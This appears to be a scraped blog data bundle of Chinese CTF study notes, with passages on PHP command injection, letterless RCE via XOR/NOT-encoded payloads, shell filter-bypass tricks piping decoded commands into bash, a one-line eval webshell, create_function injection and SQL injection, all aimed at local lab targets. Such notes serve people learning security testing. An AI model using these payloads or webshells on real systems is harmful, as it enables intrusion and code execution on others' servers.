F基本规则、方法，这是开始打卡学习的第23天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"命令执行漏洞： 定义和特点： 举例： 权限的应用 漏洞位点 漏洞利用",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第23天\n\n\n\n * 命令执行漏洞：\n * 权限的应用\n * 漏洞位点\n * 漏洞利用\n\n\n\n * 视频地址【传送门】\n\n\n# 第5章：web基础题-04-远程代码执行\n\n\n# 命令执行漏洞：\n\n# 定义和特点：\n\n1.命令执行是一种攻击，其目的是通过易受到供给的应用程序在主机操作系统上执行任意命令。当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统的命令到正常命令中，走啊称命令执行攻击。\n\n2.命令注入供给常用在向程序传入不安全的参数（命令执行参数、http头、cookie）\n\n3.命令执行继承Web Server用户的权限，一般都有权限写文件，写马、查看隐私信息、窃取源码，甚至可以反弹shell，危害十分大。一般Apache的Web Server用户权限都是www-data\n\n# 举例：\n\ncp /tmp/sourcefile /app/public/#{userinput}.jpg\n\n正常情况下，system(\"mkdir abc\");是安全的，因为用户不可控制命令执行函数中的参数，如果我们改成了\n\n<?php\n$username = $_GET['username'];\n//abc;cat /flag\n//mkdir abc;cat /flag\nsystem(\"$username\");\n?>\n\n\n1\n2\n3\n4\n5\n6\n\n\n这种情况下，如果用户输入的用户名是abc;cat /flag，在新建文件夹时就会在分号中断，实际上会执行两条命令。\n\nwww-data这个用户的权限并不高，比如不能关掉web服务、服务器关机等，一般docker里的文件都是root用户创建的，一般情况下是www-data是不能删除、不能改变文件，这些都属于写行为。\n\n> 在linux中，文件权限一般是有以下几种，用这些数字加起来，就是常见的chmod 777，644等\n> \n>  1. read r - 4\n> \n>  2. write w - 2\n> \n>  3. execute x - 1\n> \n> 常见权限示例\n> \n> 644 表示文件所有者具有读取（4）和写入（2）权限（4 + 2 = 6），文件所属组和其他用户只有读取权限（4）。这种权限设置常用于普通文本文件，文件所有者可以编辑文件，而其他用户只能查看内容。\n> \n> 755 表示文件所有者具有读取、写入和执行权限（4 + 2 + 1 = 7），文件所属组和其他用户具有读取和执行权限（4 + 1 = 5）。对于可执行脚本文件或一些需要被其他用户执行但不需要被其他用户修改的程序文件，常使用这种权限设置。\n\n\n# 权限的应用\n\n基础的情况：权限不足\n\n在awd比赛中，一般都是给的ctf或者test等用户，而其实对方给的木马是php种的马，shell.php实际上属于www-data用户，而如果这个文件是644等权限，我们用www-data就删不了，会弹出Permission denied的提示，这是权限不足。\n\n针对这种情况，我们的解决方案是：\n\n写一个马给自己，用蚁剑连上去，用这个webshell去删除别人的webshell，通过webshell就是用的www-data权限\n\n进阶的情况：不死马\n\n比如循环每间隔1秒就重新写入一个马\n\n我们的解决办法：\n\n先给自己写马，用蚁剑连上去，让用户变成www-data\n\n是kill -9 -1，即结束所有当前用户的进程\n\n如果是进程是执行的文件，比如\n\nsh busima.sh\nphp busima.php\n\n\n1\n2\n\n\n这种情况我们可以\n\nps -ef|grep busima.sh\nkill -9 pid\n\n\n1\n2\n\n\n如果是通过网页触发的，就不行，需要用第一种方式kill -9 -1杀掉当前用户所有的进程\n\n\n# 漏洞位点\n\n 1. 程序过滤不严谨，导致用户可以将代码注入并执行\n    \n    高危漏洞：\n    \n    eval()、assert()、preg_replace()、call_user_func()等\n    \n    \n    1\n    \n\n 2. 对于执行命令的函数，参数过滤不严谨，导致直接命令执行。\n    \n    高危漏洞：\n    \n    system()\n    exec()\n    shell_exec()\n    passthru()\n    ctnl_exec()\n    popen()\n    proc_open()\n    此外还有“反引号”是shell_exec()的别名\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n\n# 漏洞利用\n\n<?php\nif(isset($_GET['ip'])){\n\t$ip=$_GET['ip'];\n\techo shell_exec(\"ping -c 4\" . $ip);\n}else{\n\thighlight_file(__FILE__);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n正常情况下，我们GET方法传入一个ip地址，比如127.0.0.1，在执行时，到shell_exec()函数部分，会执行ping一个地址的命令。\n\n我们可以在ip地址后边拼接其他符号比如管道符号，比如分号，都能执行下一条命令，都是典型的命令拼接。\n\n> command1 && command2 先执行 command1，如果为真，再执行 command2 command1 | command2 只执行 command2 command1 & command2 先执行 command2 后执行 command1 command1 || command2 先执行 command1，如果为假，再执行 command2",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第23天\n\n\n\n * 命令执行漏洞：\n * 权限的应用\n * 漏洞位点\n * 漏洞利用\n\n\n\n * 视频地址【传送门】\n\n\n# 第5章：web基础题-04-远程代码执行\n\n\n# 命令执行漏洞：\n\n# 定义和特点：\n\n1.命令执行是一种攻击，其目的是通过易受到供给的应用程序在主机操作系统上执行任意命令。当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如php中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统的命令到正常命令中，走啊称命令执行攻击。\n\n2.命令注入供给常用在向程序传入不安全的参数（命令执行参数、http头、cookie）\n\n3.命令执行继承web server用户的权限，一般都有权限写文件，写马、查看隐私信息、窃取源码，甚至可以反弹shell，危害十分大。一般apache的web server用户权限都是www-data\n\n# 举例：\n\ncp /tmp/sourcefile /app/public/#{userinput}.jpg\n\n正常情况下，system(\"mkdir abc\");是安全的，因为用户不可控制命令执行函数中的参数，如果我们改成了\n\n<?php\n$username = $_get['username'];\n//abc;cat /flag\n//mkdir abc;cat /flag\nsystem(\"$username\");\n?>\n\n\n1\n2\n3\n4\n5\n6\n\n\n这种情况下，如果用户输入的用户名是abc;cat /flag，在新建文件夹时就会在分号中断，实际上会执行两条命令。\n\nwww-data这个用户的权限并不高，比如不能关掉web服务、服务器关机等，一般docker里的文件都是root用户创建的，一般情况下是www-data是不能删除、不能改变文件，这些都属于写行为。\n\n> 在linux中，文件权限一般是有以下几种，用这些数字加起来，就是常见的chmod 777，644等\n> \n>  1. read r - 4\n> \n>  2. write w - 2\n> \n>  3. execute x - 1\n> \n> 常见权限示例\n> \n> 644 表示文件所有者具有读取（4）和写入（2）权限（4 + 2 = 6），文件所属组和其他用户只有读取权限（4）。这种权限设置常用于普通文本文件，文件所有者可以编辑文件，而其他用户只能查看内容。\n> \n> 755 表示文件所有者具有读取、写入和执行权限（4 + 2 + 1 = 7），文件所属组和其他用户具有读取和执行权限（4 + 1 = 5）。对于可执行脚本文件或一些需要被其他用户执行但不需要被其他用户修改的程序文件，常使用这种权限设置。\n\n\n# 权限的应用\n\n基础的情况：权限不足\n\n在awd比赛中，一般都是给的ctf或者test等用户，而其实对方给的木马是php种的马，shell.php实际上属于www-data用户，而如果这个文件是644等权限，我们用www-data就删不了，会弹出permission denied的提示，这是权限不足。\n\n针对这种情况，我们的解决方案是：\n\n写一个马给自己，用蚁剑连上去，用这个webshell去删除别人的webshell，通过webshell就是用的www-data权限\n\n进阶的情况：不死马\n\n比如循环每间隔1秒就重新写入一个马\n\n我们的解决办法：\n\n先给自己写马，用蚁剑连上去，让用户变成www-data\n\n是kill -9 -1，即结束所有当前用户的进程\n\n如果是进程是执行的文件，比如\n\nsh busima.sh\nphp busima.php\n\n\n1\n2\n\n\n这种情况我们可以\n\nps -ef|grep busima.sh\nkill -9 pid\n\n\n1\n2\n\n\n如果是通过网页触发的，就不行，需要用第一种方式kill -9 -1杀掉当前用户所有的进程\n\n\n# 漏洞位点\n\n 1. 程序过滤不严谨，导致用户可以将代码注入并执行\n    \n    高危漏洞：\n    \n    eval()、assert()、preg_replace()、call_user_func()等\n    \n    \n    1\n    \n\n 2. 对于执行命令的函数，参数过滤不严谨，导致直接命令执行。\n    \n    高危漏洞：\n    \n    system()\n    exec()\n    shell_exec()\n    passthru()\n    ctnl_exec()\n    popen()\n    proc_open()\n    此外还有“反引号”是shell_exec()的别名\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n\n# 漏洞利用\n\n<?php\nif(isset($_get['ip'])){\n\t$ip=$_get['ip'];\n\techo shell_exec(\"ping -c 4\" . $ip);\n}else{\n\thighlight_file(__file__);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n正常情况下，我们get方法传入一个ip地址，比如127.0.0.1，在执行时，到shell_exec()函数部分，会执行ping一个地址的命令。\n\n我们可以在ip地址后边拼接其他符号比如管道符号，比如分号，都能执行下一条命令，都是典型的命令拼接。\n\n> command1 && command2 先执行 command1，如果为真，再执行 command2 command1 | command2 只执行 command2 command1 & command2 先执行 command2 后执行 command1 command1 || command2 先执行 command1，如果为假，再执行 command2",charsets:{cjk:!0},lastUpdated:"2024/12/13, 23:38:47",lastUpdatedTimestamp:1734104327e3},{title:"20241210CTF学习笔记7",frontmatter:{title:"20241210CTF学习笔记7",date:"2024-12-10T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-10-CTFLearn.html",relativePath:"views/numerology/2024-12-10-CTFLearn.md",key:"v-2f0ded78",path:"/views/numerology/2024-12-10-CTFLearn.html",headers:[{level:2,title:"无字母RCE",slug:"无字母rce",normalizedTitle:"无字母rce",charIndex:43},{level:4,title:"例题（php7）",slug:"例题-php7",normalizedTitle:"例题（php7）",charIndex:176},{level:3,title:"异或",slug:"异或",normalizedTitle:"异或",charIndex:55},{level:3,title:"取反",slug:"取反",normalizedTitle:"取反",charIndex:63},{level:3,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:71},{level:3,title:"进阶例题",slug:"进阶例题",normalizedTitle:"进阶例题",charIndex:79},{level:2,title:"create_function",slug:"create-function",normalizedTitle:"create_function",charIndex:87},{level:3,title:"定义和用法：",slug:"定义和用法",normalizedTitle:"定义和用法：",charIndex:108}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第25天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"无字母RCE 例题（php7） 异或 取反 总结 进阶例题 create_function 定义和用法：",content:'从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第25天\n\n\n\n * 无字母RCE\n   * 异或\n   * 取反\n   * 总结\n   * 进阶例题\n * create_function\n   * 定义和用法：\n\n\n\n * 视频地址【传送门】\n\n\n# 第7章：无字母RCE和create_function\n\n\n# 无字母RCE\n\n# 例题（php7）\n\n<? php \n\tif(isset($_GET[\'code\']){\n        $code=$_GET[\'code\'];\n        if(preg_match("/[a-z0-9]+/i",$code)){\n            die("NO.");\n        }\n        eval($code);\n    }else{\n        highlight_file(__FILE__);\n    }\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n在php7里，我们想要执行一个命令，但这个命令没法包含字母和数字，需要一个变换的思想，把字母和数字变换为不是字母和数字的形式，用的是位运算-异或运算，以下是方法：\n\n\n# 异或\n\n<?php\n    $a = "phpinfo";\n    for($i=0;$i<strlen($a);$i++){\t\n        echo "%".dechex(ord($a[$i])^0xff);\n    }\n    echo "^";\n    for ($i = 0; $i <strlen($a); $i++){\n        echo "%ff";\n    }\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n此外，我们需要知道一个php的特性：函数的动态调用\n\n//1.在上次讲了变量覆盖，涉及到了函数的动态调用\nextract($_GET[\'arr\']);\n@$d($_POST[\'0\']);\n\n//2.这次我们换一种方式做函数的动态调用，用括号把字符串包起来，相当于调用同名函数\n("phpinfo")()\n("php"."info")()\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n我们回到刚才的例题，我们给地址加上以下payload，就会执行phpinfo的命令：\n\nhttp://127.0.0.1:1234/php7_rce_php?code=(%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff)();\n\n\n1\n\n\n同理，我们用刚刚提到的php方法，将phpinfo改为system，替换掉payload的位置，同时也对ls或者是cat flag执行异或操作，就能得到如下请求：\n\nhttp://127.0.0.1:1234/php7_rce_php?code=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%93%8c^%ff%ff);\n\n\n1\n\n\n\n# 取反\n\n<?php\n$a="phpinfo";\necho "~(";\nfor($i=0;$i<strlen($a);$i++){\n    echo "%".bin2hex(~$a[$i]);\n}\necho ")";\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n和上边的异或方法相同，我们对phpinfo取反后，得出如下请求：\n\nhttp://127.0.0.1:1234/php7_rce_php?code=(~(%8f%97%8f%96%91%99%90))();\n\n\n1\n\n\n如果我们不想要里边儿的这一层括号可以直接删除，得到如下请求，效果相同：\n\nhttp://127.0.0.1:1234/php7_rce_php?code=(~%8f%97%8f%96%91%99%90)();\n\n\n1\n\n\n同理我们可以对system和ls进行取反\n\n\n# 总结\n\n取反和异或是比较基础和常用的绕过无字母和数字的webshell\n\n\n# 进阶例题\n\n<?php\n\terror_report(0);\n\t//flag.php\n\tif(isset($_GET[\'code\'])){\n        $code=$_GET[\'code\'];\n        if(strlen($code)>18){\n            die("You are really long, buti dont like more than 18cm");\n        }\n        if(preg_match("/\\w/",$code)){\n            die("i dislike it");\n        }\n        if(preg_match("/&|\\||\\^|\\~|\\!/",$code)){\n            die("stop calculating");\n        }\n        if(preg_match("/\\(|\\)/",$code)){\n            die("call function is not safe");\n        }\n        if(preg_match("/|{|\\}|][|\\]",$code)){\n            die("fxcking brackets");\n        }\n        if(preg_match("/\\\\$|@|\\。/",$code)){\n            die("1 dou bu gei wo");\n        }\n        eval($code)//I believe that those noob hackers cannot hack me\n    }\n>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n 1. 长度不能大于18\n 2. \\w表示字母数字下划线不能有\n 3. &与、|或、^异或、!非 以上都不能有\n 4. 不能有()括号\n 5. 不能有{}大括号[]中括号\n 6. 不能有$、@、.等符号\n\n我们只需要做一个这样的访问请求即可：\n\nhttp://127.0.0.1:1234/?code=?><?=`/???/???%20*`;\n\n\n1\n\n 1. 这个意思是?>把php结束掉，然后<?开始一个新的php\n\n> php这三个字母就是php短标签short_tag\n\n 2. \n 3. 反引号 · 表示 执行系统命令shell_exec\n 4. 星号 * 表示 任意长度的任意字符\n 5. 问号 ? 表示 单个长度的任意字符（问号匹配到了太多东西，所以执行后会有很多乱码）\n 6. %20 表示 空格\n\n最后我们执行了很多的命令，其中最重要的一条其实是\n\nshell_exec(/bin/cat/ flag);\n\n\n1\n\n\n\n# create_function\n\n\n# 定义和用法：\n\ncreate_function()函数有两个参数$args和$code，用于创建一个lambda样本的函数。\n\n$code = "return($a+$b);}eval($_POST[\'Flag\']);//"\n$f=create_function(\'$a,$b\',$code);\n\n//相当于得到：\nfunction f($a,$b){\n\treturn $a+$b\n}\neval($_POST[\'Flag\']);\n//}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n创建函数的过程中存在一个代码注入的漏洞，我们的思路是用花括号先把函数闭合掉，然后再把最后原本的花括号注释掉，中间用eval()函数写一个木马',normalizedContent:'从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第25天\n\n\n\n * 无字母rce\n   * 异或\n   * 取反\n   * 总结\n   * 进阶例题\n * create_function\n   * 定义和用法：\n\n\n\n * 视频地址【传送门】\n\n\n# 第7章：无字母rce和create_function\n\n\n# 无字母rce\n\n# 例题（php7）\n\n<? php \n\tif(isset($_get[\'code\']){\n        $code=$_get[\'code\'];\n        if(preg_match("/[a-z0-9]+/i",$code)){\n            die("no.");\n        }\n        eval($code);\n    }else{\n        highlight_file(__file__);\n    }\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n在php7里，我们想要执行一个命令，但这个命令没法包含字母和数字，需要一个变换的思想，把字母和数字变换为不是字母和数字的形式，用的是位运算-异或运算，以下是方法：\n\n\n# 异或\n\n<?php\n    $a = "phpinfo";\n    for($i=0;$i<strlen($a);$i++){\t\n        echo "%".dechex(ord($a[$i])^0xff);\n    }\n    echo "^";\n    for ($i = 0; $i <strlen($a); $i++){\n        echo "%ff";\n    }\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n此外，我们需要知道一个php的特性：函数的动态调用\n\n//1.在上次讲了变量覆盖，涉及到了函数的动态调用\nextract($_get[\'arr\']);\n@$d($_post[\'0\']);\n\n//2.这次我们换一种方式做函数的动态调用，用括号把字符串包起来，相当于调用同名函数\n("phpinfo")()\n("php"."info")()\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n我们回到刚才的例题，我们给地址加上以下payload，就会执行phpinfo的命令：\n\nhttp://127.0.0.1:1234/php7_rce_php?code=(%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff)();\n\n\n1\n\n\n同理，我们用刚刚提到的php方法，将phpinfo改为system，替换掉payload的位置，同时也对ls或者是cat flag执行异或操作，就能得到如下请求：\n\nhttp://127.0.0.1:1234/php7_rce_php?code=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%93%8c^%ff%ff);\n\n\n1\n\n\n\n# 取反\n\n<?php\n$a="phpinfo";\necho "~(";\nfor($i=0;$i<strlen($a);$i++){\n    echo "%".bin2hex(~$a[$i]);\n}\necho ")";\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n和上边的异或方法相同，我们对phpinfo取反后，得出如下请求：\n\nhttp://127.0.0.1:1234/php7_rce_php?code=(~(%8f%97%8f%96%91%99%90))();\n\n\n1\n\n\n如果我们不想要里边儿的这一层括号可以直接删除，得到如下请求，效果相同：\n\nhttp://127.0.0.1:1234/php7_rce_php?code=(~%8f%97%8f%96%91%99%90)();\n\n\n1\n\n\n同理我们可以对system和ls进行取反\n\n\n# 总结\n\n取反和异或是比较基础和常用的绕过无字母和数字的webshell\n\n\n# 进阶例题\n\n<?php\n\terror_report(0);\n\t//flag.php\n\tif(isset($_get[\'code\'])){\n        $code=$_get[\'code\'];\n        if(strlen($code)>18){\n            die("you are really long, buti dont like more than 18cm");\n        }\n        if(preg_match("/\\w/",$code)){\n            die("i dislike it");\n        }\n        if(preg_match("/&|\\||\\^|\\~|\\!/",$code)){\n            die("stop calculating");\n        }\n        if(preg_match("/\\(|\\)/",$code)){\n            die("call function is not safe");\n        }\n        if(preg_match("/|{|\\}|][|\\]",$code)){\n            die("fxcking brackets");\n        }\n        if(preg_match("/\\\\$|@|\\。/",$code)){\n            die("1 dou bu gei wo");\n        }\n        eval($code)//i believe that those noob hackers cannot hack me\n    }\n>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n 1. 长度不能大于18\n 2. \\w表示字母数字下划线不能有\n 3. &与、|或、^异或、!非 以上都不能有\n 4. 不能有()括号\n 5. 不能有{}大括号[]中括号\n 6. 不能有$、@、.等符号\n\n我们只需要做一个这样的访问请求即可：\n\nhttp://127.0.0.1:1234/?code=?><?=`/???/???%20*`;\n\n\n1\n\n 1. 这个意思是?>把php结束掉，然后<?开始一个新的php\n\n> php这三个字母就是php短标签short_tag\n\n 2. \n 3. 反引号 · 表示 执行系统命令shell_exec\n 4. 星号 * 表示 任意长度的任意字符\n 5. 问号 ? 表示 单个长度的任意字符（问号匹配到了太多东西，所以执行后会有很多乱码）\n 6. %20 表示 空格\n\n最后我们执行了很多的命令，其中最重要的一条其实是\n\nshell_exec(/bin/cat/ flag);\n\n\n1\n\n\n\n# create_function\n\n\n# 定义和用法：\n\ncreate_function()函数有两个参数$args和$code，用于创建一个lambda样本的函数。\n\n$code = "return($a+$b);}eval($_post[\'flag\']);//"\n$f=create_function(\'$a,$b\',$code);\n\n//相当于得到：\nfunction f($a,$b){\n\treturn $a+$b\n}\neval($_post[\'flag\']);\n//}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n创建函数的过程中存在一个代码注入的漏洞，我们的思路是用花括号先把函数闭合掉，然后再把最后原本的花括号注释掉，中间用eval()函数写一个木马',charsets:{cjk:!0},lastUpdated:"2024/12/13, 23:38:47",lastUpdatedTimestamp:1734104327e3},{title:"20241209CTF学习笔记6",frontmatter:{title:"20241209CTF学习笔记6",date:"2024-12-09T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-09-CTFLearn.html",relativePath:"views/numerology/2024-12-09-CTFLearn.md",key:"v-2e190f68",path:"/views/numerology/2024-12-09-CTFLearn.html",headers:[{level:3,title:"过滤空格",slug:"过滤空格",normalizedTitle:"过滤空格",charIndex:43},{level:3,title:"过滤某些关键字",slug:"过滤某些关键字",normalizedTitle:"过滤某些关键字",charIndex:51},{level:3,title:"附加题目：",slug:"附加题目",normalizedTitle:"附加题目：",charIndex:62},{level:3,title:"代码执行漏洞",slug:"代码执行漏洞",normalizedTitle:"代码执行漏洞",charIndex:71}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第24天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"过滤空格 过滤某些关键字 附加题目： 代码执行漏洞",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第24天\n\n\n\n * 过滤空格\n * 过滤某些关键字\n * 附加题目：\n * 代码执行漏洞\n\n\n\n * 视频地址【传送门】\n\n\n# 第6章：ByPass\n\n\n# 过滤空格\n\n如果空格被禁止了，那就需要用一些其他的方法\n\n# 这种情况展示不了flag，只会报找不到cat.php的文件\ncat$IFSflag.php\n# 使用以下方式可以不用空格\ncat${IFS}flag.php\n# <这个意思是导入\ncat<flag.php\n# 用逗号实现了空格的功能，需要用{}括起来\n{cat,flag.php}\n# 需要看编码支不支持\ncat%20flag.php\n# %09代表tab键\ncat%09flag.php\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 过滤某些关键字\n\n比如cat、flag等\n\n# 用反斜线转义，对字母本身做转义还等于本身\ncat fla\\g.php\n\n# 可以用两个单引号隔开\ncat fla''g.php\n\n# base64编码绕过 需要将cat flag.php或者flag.txt进行base64加密，\necho \"Y2F0IGZsYWcudHh0\" | base64 -d | bash\n\n# hex编码绕过 \n# 对于给定的十六进制字符串 \"63617420666c61672e747874\"，经过 xxd -r -p 解码后得到的文本内容是 \"cat flag.txt\"，然后通过管道传递给 bash 去执行，查看flag.txt文件\necho  echo \"63617420666c61672e747874\" | xxd -r -p | bash\n\n# 用[]去匹配\ncat fl[a]g.txt\n\n# 用[]匹配时，如果有两个字母，表示不包含两边\ncat fla[f-h].txt\n\n# 用*来匹配，代表任意长度字符\ncat fla*\n\n# 用问号匹配 正常ctf环境直接cat flag即可，将g替换为问号，问号是单个长度的任意\ncat flag.tx?\n\n# 从a—z逐行执行\ncat fl{a..z}g\n\n# 内联执行 第一行是找到flag.txt的文件 第二号反引号先执行里边的命令 然后把里边命令的结果给cat\nls | grep fla\ncat `ls | grep fla`\n# 或者有其他的内联执行\ncat $(ls |grep fla)\n\n# 用变量\na=fl;b=ag;cat $a$b.txt\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n> 在Python中，如果过滤了加号，不让使用加号时，我们可以使用如下特性绕过\n> \n> 'a'+'b'会输出ab\n> 'a''b'也会输出ab\n> \n> \n> 1\n> 2\n\n\n# 附加题目：\n\nGXYCTF2019 Ping Ping Ping\n\n\n# 代码执行漏洞\n\n# 题目练习\n\neval()函数，以下是一个一句话木马，0就是webshell的密码，蚁剑帮我们执行了很多命令，用eval去执行。\n\neval()函数在 PHP 中可以把传入的字符串当作 PHP 代码来执行。\n\n<?php eval($_POST[0]);?>\n\n\n1\n",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第24天\n\n\n\n * 过滤空格\n * 过滤某些关键字\n * 附加题目：\n * 代码执行漏洞\n\n\n\n * 视频地址【传送门】\n\n\n# 第6章：bypass\n\n\n# 过滤空格\n\n如果空格被禁止了，那就需要用一些其他的方法\n\n# 这种情况展示不了flag，只会报找不到cat.php的文件\ncat$ifsflag.php\n# 使用以下方式可以不用空格\ncat${ifs}flag.php\n# <这个意思是导入\ncat<flag.php\n# 用逗号实现了空格的功能，需要用{}括起来\n{cat,flag.php}\n# 需要看编码支不支持\ncat%20flag.php\n# %09代表tab键\ncat%09flag.php\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 过滤某些关键字\n\n比如cat、flag等\n\n# 用反斜线转义，对字母本身做转义还等于本身\ncat fla\\g.php\n\n# 可以用两个单引号隔开\ncat fla''g.php\n\n# base64编码绕过 需要将cat flag.php或者flag.txt进行base64加密，\necho \"y2f0igzsywcudhh0\" | base64 -d | bash\n\n# hex编码绕过 \n# 对于给定的十六进制字符串 \"63617420666c61672e747874\"，经过 xxd -r -p 解码后得到的文本内容是 \"cat flag.txt\"，然后通过管道传递给 bash 去执行，查看flag.txt文件\necho  echo \"63617420666c61672e747874\" | xxd -r -p | bash\n\n# 用[]去匹配\ncat fl[a]g.txt\n\n# 用[]匹配时，如果有两个字母，表示不包含两边\ncat fla[f-h].txt\n\n# 用*来匹配，代表任意长度字符\ncat fla*\n\n# 用问号匹配 正常ctf环境直接cat flag即可，将g替换为问号，问号是单个长度的任意\ncat flag.tx?\n\n# 从a—z逐行执行\ncat fl{a..z}g\n\n# 内联执行 第一行是找到flag.txt的文件 第二号反引号先执行里边的命令 然后把里边命令的结果给cat\nls | grep fla\ncat `ls | grep fla`\n# 或者有其他的内联执行\ncat $(ls |grep fla)\n\n# 用变量\na=fl;b=ag;cat $a$b.txt\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n> 在python中，如果过滤了加号，不让使用加号时，我们可以使用如下特性绕过\n> \n> 'a'+'b'会输出ab\n> 'a''b'也会输出ab\n> \n> \n> 1\n> 2\n\n\n# 附加题目：\n\ngxyctf2019 ping ping ping\n\n\n# 代码执行漏洞\n\n# 题目练习\n\neval()函数，以下是一个一句话木马，0就是webshell的密码，蚁剑帮我们执行了很多命令，用eval去执行。\n\neval()函数在 php 中可以把传入的字符串当作 php 代码来执行。\n\n<?php eval($_post[0]);?>\n\n\n1\n",charsets:{cjk:!0},lastUpdated:"2024/12/13, 23:38:47",lastUpdatedTimestamp:1734104327e3},{title:"20241211CTF学习笔记8",frontmatter:{title:"20241211CTF学习笔记8",date:"2024-12-11T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-11-CTFLearn.html",relativePath:"views/numerology/2024-12-11-CTFLearn.md",key:"v-9b84a60c",path:"/views/numerology/2024-12-11-CTFLearn.html",headers:[{level:2,title:"示例",slug:"示例",normalizedTitle:"示例",charIndex:43},{level:2,title:"示例的漏洞",slug:"示例的漏洞",normalizedTitle:"示例的漏洞",charIndex:49},{level:2,title:"如何利用示例的漏洞",slug:"如何利用示例的漏洞",normalizedTitle:"如何利用示例的漏洞",charIndex:58},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:71}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第26天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"示例 示例的漏洞 如何利用示例的漏洞 总结",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第26天\n\n\n\n * 示例\n * 示例的漏洞\n * 如何利用示例的漏洞\n * 总结\n\n\n\n * 视频地址【传送门】\n\n\n# 第8章：联合查询注入的作用\n\n\n# 示例\n\n看一段有漏洞的代码\n\n<?php\nif (isset($_REQUEST['Submit'])) {\n    // Get input 从用户请求中获取id参数\n    $id = $_REQUEST['id'];\n\n    // Check database 然后直接将id参数的值拼接进SQL语句，进行SQL查询\n    $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\";\n    $result = mysql_query($query) or die('<pre>'. mysql_error(). '</pre>');\n\n    // Get results\n    $num = mysql_numrows($result);\n    $i = 0;\n    while ($i < $num) {\n        //Get values\n        $first = mysql_result($result, $i, \"first_name\");\n        $last = mysql_result($result, $i, \"last_name\");\n\n        //Feedback for end user 最终输出查询结果\n        echo \"<pre>ID: {$id}<br />FIrest name: {$first}<br />Surname: {$last}</pre>\";\n\n        //Increase loop count\n        $i++;\n    }\n    